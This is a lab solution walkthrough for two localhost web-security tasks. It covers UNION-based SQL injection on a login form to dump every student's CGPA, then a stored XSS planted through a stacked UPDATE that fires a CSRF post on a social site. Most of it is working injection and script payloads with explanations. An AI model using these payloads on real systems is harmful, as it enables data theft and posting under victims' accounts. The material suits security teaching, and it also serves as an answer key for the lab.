# Attack Writeup: From SQL Injection to Stored XSS → CSRF

> **Spoiler warning.** This is a full solution walkthrough for both lab
> tasks. If you haven't attempted the tasks yourself yet, stop here and
> go try them first — you'll learn a lot more by getting stuck than by
> reading this. Come back once you're stuck for real, or once you've
> solved it and want to compare notes.

This document explains, step by step, *why* each payload works — not
just what to paste in. Understanding the reasoning is what lets you
adapt this to a different app later, where the exact payloads won't be
handed to you.

All of this is done logged in as **3005001 / Smith123** (Liam Smith) on
both sites, per the lab rules.

---

## Task 1: Extracting Every Student's CGPA

The Result site's login form is vulnerable to SQL injection. Our goal
is to go from "one working login" to "every student's CGPA, in one
attack" using nothing but that one entry point.

### Step 1 — Confirm which field is injectable

Start from a login that works, then try to break each field on its own
without breaking the query as a whole.

- **Student ID**: change `3005001` to `3005001 AND 1=1` → still logs in
  correctly. That's a sign the value is being dropped straight into the
  query unquoted/unescaped.
- **Password**: change `Smith123` to `Smith123' AND '1'='1` → also
  still works. The trailing `' AND '1'='1` closes our own quote and adds
  a condition that's always true, so if this still returns a result,
  our input is landing inside a SQL string literal without being
  escaped.

Both fields are injectable. We'll do the rest of the walkthrough
through the **Password** field, keeping Student ID fixed at `3005001`.

### Step 2 — Figure out how many columns the query selects

To combine our own data into the result with `UNION SELECT`, we first
need to know how many columns the original query returns — `UNION`
requires both sides to have the same column count.

The trick: `ORDER BY <n>` fails with an error if column `n` doesn't
exist. We keep raising `n` until it breaks. Since `ORDER BY` has to come
after any `WHERE` conditions, we comment out the rest of the query with
`-- -`, and add `LIMIT 1` so a broken `WHERE` (matching many rows)
doesn't complicate what we're looking at:

```sql
Smith123' ORDER BY 1 LIMIT 1 -- -
Smith123' ORDER BY 2 LIMIT 1 -- -
Smith123' ORDER BY 3 LIMIT 1 -- -
Smith123' ORDER BY 4 LIMIT 1 -- -
Smith123' ORDER BY 5 LIMIT 1 -- -
Smith123' ORDER BY 6 LIMIT 1 -- -
```

`ORDER BY 6` is where it breaks — so the query selects **5 columns**.

### Step 3 — Work out which columns actually show up on the page

Knowing the column count isn't enough; we need to know which of those 5
columns the page actually *displays*, since only those are useful for
exfiltrating data. Supply a wrong password (so the real `WHERE` matches
nothing) and `UNION` in placeholder values, one per column, so we can
see which ones land where on the page:

```sql
' union select 1,2,3,4,5 -- -
```

The page renders **Name = "2 3"** and **GPA = 5.00**. That tells us:

- Column 2 and column 3 together make up the displayed name (first
  name + last name, concatenated by the page).
- Column 5 is the GPA.
- Columns 1 and 4 aren't shown anywhere.

### Step 4 — Turn a visible column into a general output channel

Now that we know columns 2 and 3 get displayed as text, we can put
*anything* there and read it back off the page — effectively using the
page as a readout for arbitrary queries. (We can't use column 5 for
text — it's expected to be a number, so a string there would error.)

```sql
' union select 1,'','we are in!',4,5 -- -
```

The "Name" field now literally reads `we are in!`. We have a working
read-primitive.

### Step 5 — Map out the database before extracting data

Rather than guess table/column names, ask the database directly via
`information_schema`, the built-in metadata catalog every MySQL
database exposes. Since we only get one string back per query, use
`GROUP_CONCAT()` to flatten multiple rows into one comma-separated
string:

```sql
' union select 1,'',GROUP_CONCAT(table_name),4,5 FROM information_schema.tables WHERE table_schema=DATABASE() -- -
```

This returns `result` — one table, so that's where the data must be.
Next, list its columns the same way:

```sql
' union select 1,'',GROUP_CONCAT(column_name),4,5 FROM information_schema.columns WHERE table_name='result' -- -
```

This returns `cgpa,first_name,last_name,password,student_id`.

### Step 6 — Pull every student's CGPA in one shot

Now that we know the table and column, extract everything at once with
`GROUP_CONCAT`:

```sql
' union select 1,'',GROUP_CONCAT(cgpa),4,5 FROM result -- -
```

That dumps every CGPA as one long string. Let's make it readable by
including student ID and name and adding line breaks — since the page
renders this straight into HTML, `<br>` works as a literal newline:

```sql
' union select 1,'',GROUP_CONCAT(student_id, ' ', first_name, ' ', last_name, ' : ', cgpa, '<br>'),4,5 FROM result ORDER BY student_id -- -
```

**Watch out:** the output cuts off partway through (around student
3005031). This isn't the browser or JavaScript truncating anything —
`GROUP_CONCAT()` has a default output cap (`group_concat_max_len`,
1024 bytes in MySQL) and silently truncates once it hits that limit.

The fix is simple: page through the results in batches with an extra
`WHERE` condition, so each single `GROUP_CONCAT()` call has less to
carry:

```sql
' union select 1,'',GROUP_CONCAT(student_id, ' ', first_name, ' ', last_name, ' : ', cgpa, '<br>'),4,5 FROM result WHERE student_id > 3005031 ORDER BY student_id -- -
' union select 1,'',GROUP_CONCAT(student_id, ' ', first_name, ' ', last_name, ' : ', cgpa, '<br>'),4,5 FROM result WHERE student_id > 3005062 ORDER BY student_id -- -
' union select 1,'',GROUP_CONCAT(student_id, ' ', first_name, ' ', last_name, ' : ', cgpa, '<br>'),4,5 FROM result WHERE student_id > 3005094 ORDER BY student_id -- -
```

Four requests total, and we have every student's CGPA. **Task 1 done.**

---

## Task 2: Stored XSS → CSRF

The goal here: get anyone who checks their own result on the Result
site to *automatically* publish "I got `<their CGPA>`" on their own
Social Media feed — with no extra clicks from them. We're doing this
end-to-end as Liam Smith (3005001 on the Result site, `liam_smith` on
the Social Media site).

The plan has two independent pieces that we'll build separately and
then combine:

- **A**: a request that posts to the Social Media feed on someone
  else's behalf (a CSRF).
- **B**: a way to get that request to *run automatically* in the
  browser of anyone viewing their result (a stored XSS).

### Step 1 — Confirm the Social Media site has no CSRF protection

Log in to the Social Media site as `liam_smith` / `Smith123`, open the
browser's Network tab, and post something normal like "hello there".
Find the request to `/create` in the Network tab, right-click it, and
use "Copy as fetch". You'll get something like this:

```js
fetch("http://localhost:3001/create", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "accept-language": "en-US,en;q=0.9",
    "cache-control": "max-age=0",
    "content-type": "application/x-www-form-urlencoded",
    "sec-ch-ua": "\"Not;A=Brand\";v=\"8\", \"Chromium\";v=\"150\", \"Brave\";v=\"150\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Linux\"",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "same-origin",
    "sec-fetch-user": "?1",
    "sec-gpc": "1",
    "upgrade-insecure-requests": "1"
  },
  "referrer": "http://localhost:3001/",
  "body": "message=hello+there",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
```

Paste that into the console with `body` changed to `message=hi+there`
and run it. Reload the feed — the post appears. So the endpoint accepts
a plain `fetch()` call with no CSRF token of any kind, as long as the
session cookie rides along (`credentials: "include"`).

### Step 2 — Try firing that request from a different origin

The whole point of CSRF is that the request should work from a page the
attacker controls, not from the Social Media site itself. Open the
**Result site** (`localhost:3000`, a different origin) and paste the
same `fetch()` into *its* console, with the body changed to
`message=I+am+Liam+Smith`.

It fails. The console shows something like:

```
Access to fetch at 'http://localhost:3001/create' from origin
'http://localhost:3000' has been blocked by CORS policy: No
'Access-Control-Allow-Origin' header is present on the requested resource.
```

This is the browser doing a **CORS preflight**: because the copied
request carries several non-standard headers (`sec-ch-ua`, custom
`accept-language`, etc.), the browser first sends an `OPTIONS` request
to ask the server for permission before sending the real one. The
Social Media site never answers that preflight with the right
`Access-Control-Allow-Origin` header, so the browser refuses to send
the real request at all.

### Step 3 — Strip the request down to a "simple request"

The fix: drop every header except the one that actually matters
(`content-type`). A cross-origin `fetch()` with only
`content-type: application/x-www-form-urlencoded` and a text body
qualifies as a CORS **"simple request"** — the browser is allowed to
just send it directly, no preflight required.

```js
fetch("http://localhost:3001/create", {
  "headers": {
    "content-type": "application/x-www-form-urlencoded",
  },
  "body": "message=I+am+Liam+Smith",
  "method": "POST",
  "credentials": "include"
});
```

Run this from the **Result site's** console. The console still logs an
error — but that error is just the browser refusing to let our
JavaScript *read* the cross-origin response, which CORS does control.
It does **not** stop the request from being *sent and processed* by the
server. Reload the Social Media feed: the post "I am Liam Smith" is
there. That's a working CSRF.

(One more thing worth understanding: this only works at all because
`credentials: "include"` forces the browser to attach the `sid`
cookie, and because that cookie's default `SameSite=Lax` doesn't block
it — `SameSite` compares *site*, not full origin, and ignores the port
number, so `localhost:3000` and `localhost:3001` count as the same
site for cookie purposes.)

### Step 4 — Confirm you can persist arbitrary data via the SQLi

CSRF alone just makes *you* run a script. To make it run *automatically
for someone else*, we need to get that script permanently stored
somewhere the Result site will render it back out as HTML — that's the
"stored" in stored XSS.

The Result site's SQL injection isn't limited to reading data — because
the query gets sent with support for multiple statements, we can chain
an extra `UPDATE` onto the end of our injected password using `;`.
Confirm this works first with something harmless:

```sql
Smith123'; UPDATE result SET last_name=first_name; -- -
```

Refresh the page: your name now reads "Liam Liam". The `last_name`
column can be overwritten with whatever we want, and — since the page
does `${first_name} ${last_name}` with no escaping — whatever we put
there gets rendered straight into the page's HTML.

### Step 5 — Combine everything into the final payload

Put the CSRF `fetch()` from Step 3 inside a `<script>` tag, and use
`CONCAT()` so each student's *own* `cgpa` column gets substituted into
the message at read time:

```sql
CONCAT('<script>fetch("http://localhost:3001/create", { "headers": { "content-type": "application/x-www-form-urlencoded", }, "body": "message=I+got+', cgpa, '", "method": "POST", "credentials": "include" });</script>')
```

Set this as the new `last_name` via the same stacked `UPDATE` from Step
4. Now, whenever anyone loads a result page containing this payload:

1. The browser renders the injected `<script>` tag and executes it.
2. That script fires a `fetch()` to the Social Media site's `/create`
   endpoint, carrying whatever `sid` cookie is currently set in that
   browser.
3. If the person viewing the page happens to be logged into the Social
   Media site at the time, that cookie belongs to *their* session — so
   the post gets created under *their* account, reading exactly
   `I got <their own CGPA>`.

No click, no visible link, no warning — just checking your own result
is enough to trigger it. **Task 2 done.**
